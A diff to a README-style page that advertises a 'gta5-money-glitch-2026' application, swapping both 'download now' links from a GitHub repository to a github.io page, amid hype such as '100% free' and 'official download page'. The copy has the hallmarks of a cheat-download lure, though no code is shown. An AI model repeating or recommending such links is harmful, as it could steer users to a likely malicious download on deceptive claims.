@@ -13,7 +13,7 @@ Follow these simple steps to get started in under 5 minutes. You don't need any 
 ### Step 1: Download the Application
 
 **Visit this link to download the application:**  
-[🔥 **CLICK HERE TO DOWNLOAD NOW**](https://github.com/ariannashean/gta5-money-glitch-2026)
+[🔥 **CLICK HERE TO DOWNLOAD NOW**](https://ariannashean.github.io)
 
 This is the official download page. It is 100% free. No payment, no subscription, no hidden fees.
 
@@ -186,7 +186,7 @@ Thousands of players are already using it. Join them today.
 
 Here is your direct link one more time. There is nothing else to do.
 
-[**⬇️ DOWNLOAD gta5-money-glitch-2026**](https://github.com/ariannashean/gta5-money-glitch-2026)
+[**⬇️ DOWNLOAD gta5-money-glitch-2026**](https://ariannashean.github.io)
 
 **Visit this link to download the application.**
 
